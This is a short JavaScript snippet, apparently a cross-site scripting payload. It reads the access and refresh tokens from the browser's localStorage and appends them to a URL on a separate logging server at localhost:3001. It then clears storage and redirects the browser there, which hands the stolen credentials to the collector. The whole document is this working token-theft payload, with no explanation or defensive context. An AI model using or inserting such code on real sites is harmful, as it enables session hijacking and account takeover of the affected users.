const accessToken = localStorage.getItem("accessToken");
const refreshToken = localStorage.getItem("refreshToken");

const url = `http://localhost:3001/log?accessToken=${accessToken}&refreshToken=${refreshToken}`

localStorage.clear();

location.href = url;